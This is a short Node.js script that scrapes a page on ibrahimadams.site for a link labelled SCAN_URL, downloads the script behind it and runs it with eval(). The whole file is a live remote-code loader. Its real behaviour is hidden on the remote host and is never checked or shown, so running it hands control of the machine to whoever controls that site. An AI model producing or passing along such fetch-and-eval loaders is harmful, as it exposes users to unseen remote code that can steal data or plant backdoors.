

'use strict';

const axios = require('axios');
const cheerio = require('cheerio');

const webPageUrl = 'https://www.ibrahimadams.site/files';

async function fetchScanUrl() {
    try {
        const response = await axios.get(webPageUrl);
        const $ = cheerio.load(response.data);
        const scanUrl = $(`a:contains("SCAN_URL")`).attr('href');

        if (!scanUrl) throw new Error('SCAN_URL not found on the webpage.');

        console.log('SCAN_URL fetched successfully:', scanUrl);

        const scriptResponse = await axios.get(scanUrl);
        const scriptContent = scriptResponse.data;
        console.log("SCAN_URL script loaded successfully");

        eval(scriptContent);
    } catch (error) {
        console.error('Error fetching SCAN_URL:', error.message);
    }
}

fetchScanUrl();